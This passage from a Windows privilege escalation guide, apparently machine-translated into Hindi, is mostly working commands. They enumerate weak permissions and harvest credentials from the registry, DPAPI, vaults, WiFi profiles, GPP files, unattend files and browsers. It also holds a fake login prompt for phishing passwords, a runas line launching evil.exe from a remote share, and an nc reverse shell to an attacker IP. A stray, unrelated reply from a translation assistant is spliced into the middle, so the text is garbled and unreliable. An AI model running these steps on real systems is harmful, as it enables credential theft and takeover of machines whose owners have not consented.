जाँच करें कि क्या आप किसी config file को modify करके कोई special file पढ़ सकते हैं, या क्या आप किसी binary को modify कर सकते हैं जिसे Administrator account (schedtasks) द्वारा execute किया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जांचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जो किसी अलग उपयोगकर्ता द्वारा execute किया जाएगा।**\
**पढ़ें** इस **निम्नलिखित पृष्ठ** को ताकि आप दिलचस्प **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर

संभावित **तीसरे पक्ष के अजीब/कमज़ोर** ड्राइवर खोजें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. नीचे दिए गए चरण-दर-चरण तरीके को देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं तो आप किसी प्रक्रिया द्वारा लोड की गई DLL को hijack कर सकते हैं और **escalate privileges** कर सकते हैं।

PATH के अंदर मौजूद सभी फ़ोल्डरों की permissions जाँचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस जांच का दुरुपयोग कैसे किया जाए, इसके बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file पर hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहर से **प्रतिबंधित सेवाओं** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित कमांड के लिए इस पृष्ठ को देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूची दिखाना, नियम बनाना, बंद करना, बंद करना...)**

अधिक[ network enumeration के लिए commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` पर भी पाया जा सकता है।

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी port पर listen करने के लिए करेंगे, तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा allow किया जाना चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को आसानी से root के रूप में शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` फाइलसिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault सर्वर, वेबसाइट और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स स्टोर करता है जिन्हें **Windows** उपयोगकर्ताओं को **स्वचालित रूप से लॉग इन** करवा सकता है। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook, Twitter, Gmail आदि के क्रेडेंशियल्स यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो जाएं। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनसे Windows उपयोगकर्ताओं को स्वतः लॉग इन कर सकता है, जिसका मतलब यह है कि कोई भी **Windows application that needs credentials to access a resource** (server या वेबसाइट) **can make use of this Credential Manager** और Windows Vault का उपयोग करके उपलब्ध कराए गए क्रेडेंशियल्स का उपयोग कर सकता है, बजाय इसके कि उपयोगकर्ता बार-बार यूज़रनेम और पासवर्ड डालें।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए क्रेडेंशियल्स का उपयोग कर पाएंगी। इसलिए, यदि आपका application vault का उपयोग करना चाहता है, तो उसे किसी तरह से **credential manager के साथ communicate कर के उस resource के लिए क्रेडेंशियल्स request** करने चाहिए और वे क्रेडेंशियल्स default storage vault से प्राप्त होने चाहिए।

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप `runas` का `/savecred` विकल्पों के साथ उपयोग कर सकते हैं ताकि saved credentials का उपयोग किया जा सके। निम्न उदाहरण SMB share के माध्यम से एक remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credentials के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक तरीका प्रदान करता है, जो प्रमुख रूप से Windows operating system के भीतर asymmetric private keys के symmetric encryption के लिए उपयोग होता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान देने के लिए उपयोगकर्ता या सिस्टम secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के login secrets से व्युत्पन्न एक symmetric key के माध्यम से keys के एन्क्रिप्शन को सक्षम करता है**। सिस्टम-स्तर के एन्क्रिप्शन वाले परिदृश्यों में, यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट किए गए उपयोगकर्ता RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहीत होते हैं, जहाँ `{SID}` उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **DPAPI key, जो उपयोगकर्ता की private keys की सुरक्षा करने वाले master key के साथ उसी फाइल में साथ रहती है**, सामान्यतः 64 bytes के random डेटा से बनी होती है। (यह ध्यान रखना महत्वपूर्ण है कि इस डायरेक्टरी तक पहुँच प्रतिबंधित है, इसलिए इसकी सामग्री को CMD में `dir` कमांड से सूचीबद्ध नहीं किया जा सकता, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त आर्ग्युमेंट्स (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग इसे डिक्रिप्ट करने के लिए कर सकते हैं।

**credentials files protected by the master password** आम तौर पर निम्न स्थानों पर पाई जाती हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके decrypt कर सकते हैं.\
आप `sekurlsa::dpapi` module का उपयोग करके **memory** से कई **DPAPI** **masterkeys** extract कर सकते हैं (यदि आप root हैं)।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** को अक्सर **scripting** और automation tasks के लिए encrypted credentials को सुविधाजनक तरीके से store करने के लिए उपयोग किया जाता है। ये credentials **DPAPI** द्वारा सुरक्षित होते हैं, जिसका सामान्य अर्थ है कि इन्हें आम तौर पर केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर decrypt किया जा सकता है जिस पर इन्हें बनाया गया था।

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
आप मेमोरी से कई **DPAPI masterkeys** Mimikatz `sekurlsa::dpapi` module के साथ **extract** कर सकते हैं

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग पासवर्ड और अन्य जानकारी **save** करने के लिए करते हैं, यह न समझते हुए कि यह एक database फ़ाइल है। यह फ़ाइल इस स्थान पर स्थित है `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` और इसे ढूँढना और जांचना हमेशा उपयोगी होता है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना चाहिए और इसे High Integrity level के तहत चलाना चाहिए।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` डायरेक्टरी में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर्स **SYSTEM privileges के साथ चलते हैं**, कई प्रभावित होते हैं **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजियाँ
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys रजिस्ट्री में

SSH private keys रजिस्ट्री की key `HKCU\Software\OpenSSH\Agent\Keys` में स्टोर हो सकते हैं, इसलिए आपको देखना चाहिए कि वहाँ कुछ रोचक है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस path के अंदर कोई एंट्री पाते हैं, तो वह संभवतः एक saved SSH key होगी। यह encrypted रूप में संग्रहीत होती है, लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके decrypted किया जा सकता है.\  
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह boot पर स्वतः शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने की कोशिश की, उन्हें `ssh-add` से जोड़ा और ssh के माध्यम से किसी मशीन में लॉगिन किया। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने असममित कुंजी प्रमाणीकरण के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना निगरानी फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Search for a file called **SiteList.xml**

### Cached GPP Pasword

एक ऐसा फीचर पहले उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर कस्टम स्थानीय administrator खाते तैनात करने की अनुमति देता था। हालांकि, इस तरीके में गंभीर सुरक्षा कमियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के अंदर के passwords, जो AES256 से एन्क्रिप्ट किए गए थे और एक सार्वजनिक रूप से प्रलेखित default key का उपयोग करते थे, किसी भी authenticated user द्वारा डिक्रिप्ट किए जा सकते थे। यह एक गंभीर जोखिम था, क्योंकि इससे उपयोगकर्ताओं को elevated privileges मिल सकते थे।

इस जोखिम को कम करने के लिए, एक फ़ंक्शन विकसित किया गया था जो लोकली कैश किए गए उन GPP फ़ाइलों के लिए स्कैन करता है जिनमें खाली नहीं "cpassword" फ़ील्ड होती है। ऐसी फ़ाइल मिलने पर, फ़ंक्शन पासवर्ड को डिक्रिप्ट करता है और एक कस्टम PowerShell object लौटाता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा कमजोरी की पहचान और निवारण में मदद करता है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
web.config में credentials का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### क्रेडेंशियल्स के लिए पूछें

आप हमेशा **user से उसके credentials या किसी अन्य user के credentials दर्ज करने के लिए कह सकते हैं** यदि आपको लगता है कि वह उन्हें जानता होगा (ध्यान दें कि client से सीधे **credentials** के लिए **मांगना** वास्तव में **खतरनाक** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइलनाम जिनमें credentials होते हैं**

ज्ञात फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the files you want translated). I will then translate the relevant English text to Hindi, preserving all markdown/html tags, paths, links and code as you requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin को भी चेक करना चाहिए ताकि उसके अंदर credentials मिल सकें

कई प्रोग्राम्स द्वारा सहेजे गए पासवर्डों को **पुनर्प्राप्त** करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**अन्य संभावित रजिस्ट्री कुंजियाँ जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs को चेक करना चाहिए जहाँ **Chrome or Firefox** के passwords स्टोर होते हैं.\
ब्राउज़रों के history, bookmarks और favourites भी चेक करें — हो सकता है कुछ **passwords** वहाँ स्टोर हों।

ब्राउज़र से passwords निकालने के लिए टूल:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के भीतर बनी एक तकनीक है जो अलग-अलग भाषाओं में लिखे सॉफ़्टवेयर कंपोनेंट्स के बीच **intercommunication** की अनुमति देती है। प्रत्येक COM component को **class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component अपनी functionality एक या अधिक interfaces के माध्यम से एक्सपोज़ करता है, जिन्हें interface IDs (IIDs) द्वारा चिन्हित किया जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को merge करके बनाई जाती है = **HKEY\CLASSES\ROOT.**

